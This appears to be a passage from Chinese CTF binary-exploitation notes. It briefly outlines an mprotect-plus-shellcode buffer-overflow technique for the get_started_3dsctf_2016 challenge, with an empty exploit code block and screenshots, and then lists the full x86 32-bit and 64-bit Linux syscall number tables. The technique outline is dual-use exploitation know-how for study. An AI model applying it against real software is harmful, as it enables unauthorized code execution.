这里用`get_started_3dsctf_2016`来演示这个类型的题目, 思路: 首先造成溢出, 让程序跳转到`mprotect`函数地址, 然后来设置`mprotect`的参数, 完成了修改内存为可读可写可执行, 将程序重定向到了我们修改好后的内存地址, 接下来我们只要传入`shellcode`即可.

`exploit`如下:

```python

```

<div align=center><img src="./images/41.png"></div>
<div align=center><img src="./images/42.png"></div>
<div align=center><img src="./images/43.png"></div>
<div align=center><img src="./images/44.png"></div>
<div align=center><img src="./images/45.png"></div>
<div align=center><img src="./images/46.png"></div>
<div align=center><img src="./images/47.png"></div>
<div align=center><img src="./images/48.png"></div>
<div align=center><img src="./images/49.png"></div>

# Linux 系统调用号表
## 32 位
```c++
#ifndef _ASM_X86_UNISTD_32_H
#define _ASM_X86_UNISTD_32_H 1

#define __NR_restart_syscall 0
#define __NR_exit 1
#define __NR_fork 2
#define __NR_read 3
#define __NR_write 4
#define __NR_open 5
#define __NR_close 6
#define __NR_waitpid 7
#define __NR_creat 8
#define __NR_link 9
#define __NR_unlink 10
#define __NR_execve 11
#define __NR_chdir 12
#define __NR_time 13
#define __NR_mknod 14
#define __NR_chmod 15
#define __NR_lchown 16
#define __NR_break 17
#define __NR_oldstat 18
#define __NR_lseek 19
#define __NR_getpid 20
#define __NR_mount 21
#define __NR_umount 22
#define __NR_setuid 23
#define __NR_getuid 24
#define __NR_stime 25
#define __NR_ptrace 26
#define __NR_alarm 27
#define __NR_oldfstat 28
#define __NR_pause 29
#define __NR_utime 30
#define __NR_stty 31
#define __NR_gtty 32
#define __NR_access 33
#define __NR_nice 34
#define __NR_ftime 35
#define __NR_sync 36
#define __NR_kill 37
#define __NR_rename 38
#define __NR_mkdir 39
#define __NR_rmdir 40
#define __NR_dup 41
#define __NR_pipe 42
#define __NR_times 43
#define __NR_prof 44
#define __NR_brk 45
#define __NR_setgid 46
#define __NR_getgid 47
#define __NR_signal 48
#define __NR_geteuid 49
#define __NR_getegid 50
#define __NR_acct 51
#define __NR_umount2 52
#define __NR_lock 53
#define __NR_ioctl 54
#define __NR_fcntl 55
#define __NR_mpx 56
#define __NR_setpgid 57
#define __NR_ulimit 58
#define __NR_oldolduname 59
#define __NR_umask 60
#define __NR_chroot 61
#define __NR_ustat 62
#define __NR_dup2 63
#define __NR_getppid 64
#define __NR_getpgrp 65
#define __NR_setsid 66
#define __NR_sigaction 67
#define __NR_sgetmask 68
#define __NR_ssetmask 69
#define __NR_setreuid 70
#define __NR_setregid 71
#define __NR_sigsuspend 72
#define __NR_sigpending 73
#define __NR_sethostname 74
#define __NR_setrlimit 75
#define __NR_getrlimit 76
#define __NR_getrusage 77
#define __NR_gettimeofday 78
#define __NR_settimeofday 79
#define __NR_getgroups 80
#define __NR_setgroups 81
#define __NR_select 82
#define __NR_symlink 83
#define __NR_oldlstat 84
#define __NR_readlink 85
#define __NR_uselib 86
#define __NR_swapon 87
#define __NR_reboot 88
#define __NR_readdir 89
#define __NR_mmap 90
#define __NR_munmap 91
#define __NR_truncate 92
#define __NR_ftruncate 93
#define __NR_fchmod 94
#define __NR_fchown 95
#define __NR_getpriority 96
#define __NR_setpriority 97
#define __NR_profil 98
#define __NR_statfs 99
#define __NR_fstatfs 100
#define __NR_ioperm 101
#define __NR_socketcall 102
#define __NR_syslog 103
#define __NR_setitimer 104
#define __NR_getitimer 105
#define __NR_stat 106
#define __NR_lstat 107
#define __NR_fstat 108
#define __NR_olduname 109
#define __NR_iopl 110
#define __NR_vhangup 111
#define __NR_idle 112
#define __NR_vm86old 113
#define __NR_wait4 114
#define __NR_swapoff 115
#define __NR_sysinfo 116
#define __NR_ipc 117
#define __NR_fsync 118
#define __NR_sigreturn 119
#define __NR_clone 120
#define __NR_setdomainname 121
#define __NR_uname 122
#define __NR_modify_ldt 123
#define __NR_adjtimex 124
#define __NR_mprotect 125
#define __NR_sigprocmask 126
#define __NR_create_module 127
#define __NR_init_module 128
#define __NR_delete_module 129
#define __NR_get_kernel_syms 130
#define __NR_quotactl 131
#define __NR_getpgid 132
#define __NR_fchdir 133
#define __NR_bdflush 134
#define __NR_sysfs 135
#define __NR_personality 136
#define __NR_afs_syscall 137
#define __NR_setfsuid 138
#define __NR_setfsgid 139
#define __NR__llseek 140
#define __NR_getdents 141
#define __NR__newselect 142
#define __NR_flock 143
#define __NR_msync 144
#define __NR_readv 145
#define __NR_writev 146
#define __NR_getsid 147
#define __NR_fdatasync 148
#define __NR__sysctl 149
#define __NR_mlock 150
#define __NR_munlock 151
#define __NR_mlockall 152
#define __NR_munlockall 153
#define __NR_sched_setparam 154
#define __NR_sched_getparam 155
#define __NR_sched_setscheduler 156
#define __NR_sched_getscheduler 157
#define __NR_sched_yield 158
#define __NR_sched_get_priority_max 159
#define __NR_sched_get_priority_min 160
#define __NR_sched_rr_get_interval 161
#define __NR_nanosleep 162
#define __NR_mremap 163
#define __NR_setresuid 164
#define __NR_getresuid 165
#define __NR_vm86 166
#define __NR_query_module 167
#define __NR_poll 168
#define __NR_nfsservctl 169
#define __NR_setresgid 170
#define __NR_getresgid 171
#define __NR_prctl 172
#define __NR_rt_sigreturn 173
#define __NR_rt_sigaction 174
#define __NR_rt_sigprocmask 175
#define __NR_rt_sigpending 176
#define __NR_rt_sigtimedwait 177
#define __NR_rt_sigqueueinfo 178
#define __NR_rt_sigsuspend 179
#define __NR_pread64 180
#define __NR_pwrite64 181
#define __NR_chown 182
#define __NR_getcwd 183
#define __NR_capget 184
#define __NR_capset 185
#define __NR_sigaltstack 186
#define __NR_sendfile 187
#define __NR_getpmsg 188
#define __NR_putpmsg 189
#define __NR_vfork 190
#define __NR_ugetrlimit 191
#define __NR_mmap2 192
#define __NR_truncate64 193
#define __NR_ftruncate64 194
#define __NR_stat64 195
#define __NR_lstat64 196
#define __NR_fstat64 197
#define __NR_lchown32 198
#define __NR_getuid32 199
#define __NR_getgid32 200
#define __NR_geteuid32 201
#define __NR_getegid32 202
#define __NR_setreuid32 203
#define __NR_setregid32 204
#define __NR_getgroups32 205
#define __NR_setgroups32 206
#define __NR_fchown32 207
#define __NR_setresuid32 208
#define __NR_getresuid32 209
#define __NR_setresgid32 210
#define __NR_getresgid32 211
#define __NR_chown32 212
#define __NR_setuid32 213
#define __NR_setgid32 214
#define __NR_setfsuid32 215
#define __NR_setfsgid32 216
#define __NR_pivot_root 217
#define __NR_mincore 218
#define __NR_madvise 219
#define __NR_getdents64 220
#define __NR_fcntl64 221
#define __NR_gettid 224
#define __NR_readahead 225
#define __NR_setxattr 226
#define __NR_lsetxattr 227
#define __NR_fsetxattr 228
#define __NR_getxattr 229
#define __NR_lgetxattr 230
#define __NR_fgetxattr 231
#define __NR_listxattr 232
#define __NR_llistxattr 233
#define __NR_flistxattr 234
#define __NR_removexattr 235
#define __NR_lremovexattr 236
#define __NR_fremovexattr 237
#define __NR_tkill 238
#define __NR_sendfile64 239
#define __NR_futex 240
#define __NR_sched_setaffinity 241
#define __NR_sched_getaffinity 242
#define __NR_set_thread_area 243
#define __NR_get_thread_area 244
#define __NR_io_setup 245
#define __NR_io_destroy 246
#define __NR_io_getevents 247
#define __NR_io_submit 248
#define __NR_io_cancel 249
#define __NR_fadvise64 250
#define __NR_exit_group 252
#define __NR_lookup_dcookie 253
#define __NR_epoll_create 254
#define __NR_epoll_ctl 255
#define __NR_epoll_wait 256
#define __NR_remap_file_pages 257
#define __NR_set_tid_address 258
#define __NR_timer_create 259
#define __NR_timer_settime 260
#define __NR_timer_gettime 261
#define __NR_timer_getoverrun 262
#define __NR_timer_delete 263
#define __NR_clock_settime 264
#define __NR_clock_gettime 265
#define __NR_clock_getres 266
#define __NR_clock_nanosleep 267
#define __NR_statfs64 268
#define __NR_fstatfs64 269
#define __NR_tgkill 270
#define __NR_utimes 271
#define __NR_fadvise64_64 272
#define __NR_vserver 273
#define __NR_mbind 274
#define __NR_get_mempolicy 275
#define __NR_set_mempolicy 276
#define __NR_mq_open 277
#define __NR_mq_unlink 278
#define __NR_mq_timedsend 279
#define __NR_mq_timedreceive 280
#define __NR_mq_notify 281
#define __NR_mq_getsetattr 282
#define __NR_kexec_load 283
#define __NR_waitid 284
#define __NR_add_key 286
#define __NR_request_key 287
#define __NR_keyctl 288
#define __NR_ioprio_set 289
#define __NR_ioprio_get 290
#define __NR_inotify_init 291
#define __NR_inotify_add_watch 292
#define __NR_inotify_rm_watch 293
#define __NR_migrate_pages 294
#define __NR_openat 295
#define __NR_mkdirat 296
#define __NR_mknodat 297
#define __NR_fchownat 298
#define __NR_futimesat 299
#define __NR_fstatat64 300
#define __NR_unlinkat 301
#define __NR_renameat 302
#define __NR_linkat 303
#define __NR_symlinkat 304
#define __NR_readlinkat 305
#define __NR_fchmodat 306
#define __NR_faccessat 307
#define __NR_pselect6 308
#define __NR_ppoll 309
#define __NR_unshare 310
#define __NR_set_robust_list 311
#define __NR_get_robust_list 312
#define __NR_splice 313
#define __NR_sync_file_range 314
#define __NR_tee 315
#define __NR_vmsplice 316
#define __NR_move_pages 317
#define __NR_getcpu 318
#define __NR_epoll_pwait 319
#define __NR_utimensat 320
#define __NR_signalfd 321
#define __NR_timerfd_create 322
#define __NR_eventfd 323
#define __NR_fallocate 324
#define __NR_timerfd_settime 325
#define __NR_timerfd_gettime 326
#define __NR_signalfd4 327
#define __NR_eventfd2 328
#define __NR_epoll_create1 329
#define __NR_dup3 330
#define __NR_pipe2 331
#define __NR_inotify_init1 332
#define __NR_preadv 333
#define __NR_pwritev 334
#define __NR_rt_tgsigqueueinfo 335
#define __NR_perf_event_open 336
#define __NR_recvmmsg 337
#define __NR_fanotify_init 338
#define __NR_fanotify_mark 339
#define __NR_prlimit64 340
#define __NR_name_to_handle_at 341
#define __NR_open_by_handle_at 342
#define __NR_clock_adjtime 343
#define __NR_syncfs 344
#define __NR_sendmmsg 345
#define __NR_setns 346
#define __NR_process_vm_readv 347
#define __NR_process_vm_writev 348
#define __NR_kcmp 349
#define __NR_finit_module 350
#define __NR_sched_setattr 351
#define __NR_sched_getattr 352
#define __NR_renameat2 353
#define __NR_seccomp 354
#define __NR_getrandom 355
#define __NR_memfd_create 356
#define __NR_bpf 357
#define __NR_execveat 358
#define __NR_socket 359
#define __NR_socketpair 360
#define __NR_bind 361
#define __NR_connect 362
#define __NR_listen 363
#define __NR_accept4 364
#define __NR_getsockopt 365
#define __NR_setsockopt 366
#define __NR_getsockname 367
#define __NR_getpeername 368
#define __NR_sendto 369
#define __NR_sendmsg 370
#define __NR_recvfrom 371
#define __NR_recvmsg 372
#define __NR_shutdown 373
#define __NR_userfaultfd 374
#define __NR_membarrier 375
#define __NR_mlock2 376
#define __NR_copy_file_range 377
#define __NR_preadv2 378
#define __NR_pwritev2 379

#endif /* _ASM_X86_UNISTD_32_H */
```

### 64 位
```c++
#ifndef _ASM_X86_UNISTD_64_H
#define _ASM_X86_UNISTD_64_H 1

#define __NR_read 0
#define __NR_write 1
#define __NR_open 2
#define __NR_close 3
#define __NR_stat 4
#define __NR_fstat 5
#define __NR_lstat 6
#define __NR_poll 7
#define __NR_lseek 8
#define __NR_mmap 9
#define __NR_mprotect 10
#define __NR_munmap 11
#define __NR_brk 12
#define __NR_rt_sigaction 13
#define __NR_rt_sigprocmask 14
#define __NR_rt_sigreturn 15
#define __NR_ioctl 16
#define __NR_pread64 17
#define __NR_pwrite64 18
#define __NR_readv 19
#define __NR_writev 20
#define __NR_access 21
#define __NR_pipe 22
#define __NR_select 23
#define __NR_sched_yield 24
#define __NR_mremap 25
#define __NR_msync 26
#define __NR_mincore 27
#define __NR_madvise 28
#define __NR_shmget 29
#define __NR_shmat 30
#define __NR_shmctl 31
#define __NR_dup 32
#define __NR_dup2 33
#define __NR_pause 34
#define __NR_nanosleep 35
#define __NR_getitimer 36
#define __NR_alarm 37
#define __NR_setitimer 38
#define __NR_getpid 39
#define __NR_sendfile 40
#define __NR_socket 41
#define __NR_connect 42
#define __NR_accept 43
#define __NR_sendto 44
#define __NR_recvfrom 45
#define __NR_sendmsg 46
#define __NR_recvmsg 47
#define __NR_shutdown 48
#define __NR_bind 49
#define __NR_listen 50
#define __NR_getsockname 51
#define __NR_getpeername 52
#define __NR_socketpair 53
#define __NR_setsockopt 54
#define __NR_getsockopt 55
#define __NR_clone 56
#define __NR_fork 57
#define __NR_vfork 58
#define __NR_execve 59
#define __NR_exit 60
#define __NR_wait4 61
#define __NR_kill 62
#define __NR_uname 63
#define __NR_semget 64
#define __NR_semop 65
#define __NR_semctl 66
#define __NR_shmdt 67
#define __NR_msgget 68
#define __NR_msgsnd 69
#define __NR_msgrcv 70
#define __NR_msgctl 71
#define __NR_fcntl 72
#define __NR_flock 73
#define __NR_fsync 74
#define __NR_fdatasync 75
#define __NR_truncate 76
#define __NR_ftruncate 77
#define __NR_getdents 78
#define __NR_getcwd 79
#define __NR_chdir 80
#define __NR_fchdir 81
#define __NR_rename 82
#define __NR_mkdir 83
#define __NR_rmdir 84
#define __NR_creat 85
#define __NR_link 86
#define __NR_unlink 87
#define __NR_symlink 88
#define __NR_readlink 89
#define __NR_chmod 90
#define __NR_fchmod 91
#define __NR_chown 92
#define __NR_fchown 93
#define __NR_lchown 94
#define __NR_umask 95
#define __NR_gettimeofday 96
#define __NR_getrlimit 97
#define __NR_getrusage 98
#define __NR_sysinfo 99
#define __NR_times 100
#define __NR_ptrace 101
#define __NR_getuid 102
#define __NR_syslog 103
#define __NR_getgid 104
#define __NR_setuid 105
#define __NR_setgid 106
#define __NR_geteuid 107
#define __NR_getegid 108
#define __NR_setpgid 109
#define __NR_getppid 110
#define __NR_getpgrp 111
#define __NR_setsid 112
#define __NR_setreuid 113
#define __NR_setregid 114
#define __NR_getgroups 115
#define __NR_setgroups 116
#define __NR_setresuid 117
#define __NR_getresuid 118
#define __NR_setresgid 119
#define __NR_getresgid 120
#define __NR_getpgid 121
#define __NR_setfsuid 122
#define __NR_setfsgid 123
#define __NR_getsid 124
#define __NR_capget 125
#define __NR_capset 126
#define __NR_rt_sigpending 127
#define __NR_rt_sigtimedwait 128
#define __NR_rt_sigqueueinfo 129
#define __NR_rt_sigsuspend 130
#define __NR_sigaltstack 131
#define __NR_utime 132
#define __NR_mknod 133
#define __NR_uselib 134
#define __NR_personality 135
#define __NR_ustat 136
#define __NR_statfs 137
#define __NR_fstatfs 138
#define __NR_sysfs 139
#define __NR_getpriority 140
#define __NR_setpriority 141
#define __NR_sched_setparam 142
#define __NR_sched_getparam 143
#define __NR_sched_setscheduler 144
#define __NR_sched_getscheduler 145
#define __NR_sched_get_priority_max 146
#define __NR_sched_get_priority_min 147
#define __NR_sched_rr_get_interval 148
#define __NR_mlock 149
#define __NR_munlock 150
#define __NR_mlockall 151
#define __NR_munlockall 152
#define __NR_vhangup 153
#define __NR_modify_ldt 154
#define __NR_pivot_root 155
#define __NR__sysctl 156
#define __NR_prctl 157
#define __NR_arch_prctl 158
#define __NR_adjtimex 159
#define __NR_setrlimit 160
#define __NR_chroot 161
#define __NR_sync 162
#define __NR_acct 163
#define __NR_settimeofday 164
#define __NR_mount 165
#define __NR_umount2 166
#define __NR_swapon 167
#define __NR_swapoff 168
#define __NR_reboot 169
#define __NR_sethostname 170
#define __NR_setdomainname 171
#define __NR_iopl 172
#define __NR_ioperm 173
#define __NR_create_module 174
#define __NR_init_module 175
#define __NR_delete_module 176
#define __NR_get_kernel_syms 177
#define __NR_query_module 178
#define __NR_quotactl 179
#define __NR_nfsservctl 180
#define __NR_getpmsg 181
#define __NR_putpmsg 182
#define __NR_afs_syscall 183
#define __NR_tuxcall 184
#define __NR_security 185
#define __NR_gettid 186
#define __NR_readahead 187
#define __NR_setxattr 188
#define __NR_lsetxattr 189
#define __NR_fsetxattr 190
#define __NR_getxattr 191
#define __NR_lgetxattr 192
#define __NR_fgetxattr 193
#define __NR_listxattr 194
#define __NR_llistxattr 195
#define __NR_flistxattr 196
#define __NR_removexattr 197
#define __NR_lremovexattr 198
#define __NR_fremovexattr 199
#define __NR_tkill 200
#define __NR_time 201
#define __NR_futex 202
#define __NR_sched_setaffinity 203
#define __NR_sched_getaffinity 204
#define __NR_set_thread_area 205
#define __NR_io_setup 206
#define __NR_io_destroy 207
#define __NR_io_getevents 208
#define __NR_io_submit 209
#define __NR_io_cancel 210
#define __NR_get_thread_area 211
#define __NR_lookup_dcookie 212
#define __NR_epoll_create 213
#define __NR_epoll_ctl_old 214
#define __NR_epoll_wait_old 215
#define __NR_remap_file_pages 216
#define __NR_getdents64 217
#define __NR_set_tid_address 218
#define __NR_restart_syscall 219
#define __NR_semtimedop 220
#define __NR_fadvise64 221
#define __NR_timer_create 222
#define __NR_timer_settime 223
#define __NR_timer_gettime 224
#define __NR_timer_getoverrun 225
#define __NR_timer_delete 226
#define __NR_clock_settime 227
#define __NR_clock_gettime 228
#define __NR_clock_getres 229
#define __NR_clock_nanosleep 230
#define __NR_exit_group 231
#define __NR_epoll_wait 232
#define __NR_epoll_ctl 233
#define __NR_tgkill 234
#define __NR_utimes 235
#define __NR_vserver 236
#define __NR_mbind 237
#define __NR_set_mempolicy 238
#define __NR_get_mempolicy 239
#define __NR_mq_open 240
#define __NR_mq_unlink 241
#define __NR_mq_timedsend 242
#define __NR_mq_timedreceive 243
#define __NR_mq_notify 244
#define __NR_mq_getsetattr 245
#define __NR_kexec_load 246
#define __NR_waitid 247
#define __NR_add_key 248
#define __NR_request_key 249
#define __NR_keyctl 250
#define __NR_ioprio_set 251
#define __NR_ioprio_get 252
#define __NR_inotify_init 253
#define __NR_inotify_add_watch 254
#define __NR_inotify_rm_watch 255
#define __NR_migrate_pages 256
#define __NR_openat 257
#define __NR_mkdirat 258
#define __NR_mknodat 259
#define __NR_fchownat 260
#define __NR_futimesat 261
#define __NR_newfstatat 262
#define __NR_unlinkat 263
#define __NR_renameat 264
#define __NR_linkat 265
#define __NR_symlinkat 266
#define __NR_readlinkat 267
#define __NR_fchmodat 268
#define __NR_faccessat 269
#define __NR_pselect6 270
#define __NR_ppoll 271
#define __NR_unshare 272
#define __NR_set_robust_list 273
#define __NR_get_robust_list 274
#define __NR_splice 275
#define __NR_tee 276
#define __NR_sync_file_range 277
#define __NR_vmsplice 278
#define __NR_move_pages 279
#define __NR_utimensat 280
#define __NR_epoll_pwait 281
#define __NR_signalfd 282
#define __NR_timerfd_create 283
#define __NR_eventfd 284
#define __NR_fallocate 285
#define __NR_timerfd_settime 286
#define __NR_timerfd_gettime 287
#define __NR_accept4 288
#define __NR_signalfd4 289
#define __NR_eventfd2 290
#define __NR_epoll_create1 291
#define __NR_dup3 292
#define __NR_pipe2 293
#define __NR_inotify_init1 294
#define __NR_preadv 295
#define __NR_pwritev 296
#define __NR_rt_tgsigqueueinfo 297
#define __NR_perf_event_open 298
#define __NR_recvmmsg 299
#define __NR_fanotify_init 300
#define __NR_fanotify_mark 301
#define __NR_prlimit64 302
#define __NR_name_to_handle_at 303
#define __NR_open_by_handle_at 304
#define __NR_clock_adjtime 305
#define __NR_syncfs 306
#define __NR_sendmmsg 307
#define __NR_setns 308
#define __NR_getcpu 309
#define __NR_process_vm_readv 310
#define __NR_process_vm_writev 311
#define __NR_kcmp 312
#define __NR_finit_module 313
#define __NR_sched_setattr 314
#define __NR_sched_getattr 315
#define __NR_renameat2 316
#define __NR_seccomp 317
#define __NR_getrandom 318
#define __NR_memfd_create 319
#define __NR_kexec_file_load 320
#define __NR_bpf 321
#define __NR_execveat 322
#define __NR_userfaultfd 323
#define __NR_membarrier 324
#define __NR_mlock2 325
#define __NR_copy_file_range 326
#define __NR_preadv2 327
#define __NR_pwritev2 328

#endif /* _ASM_X86_UNISTD_64_H */
```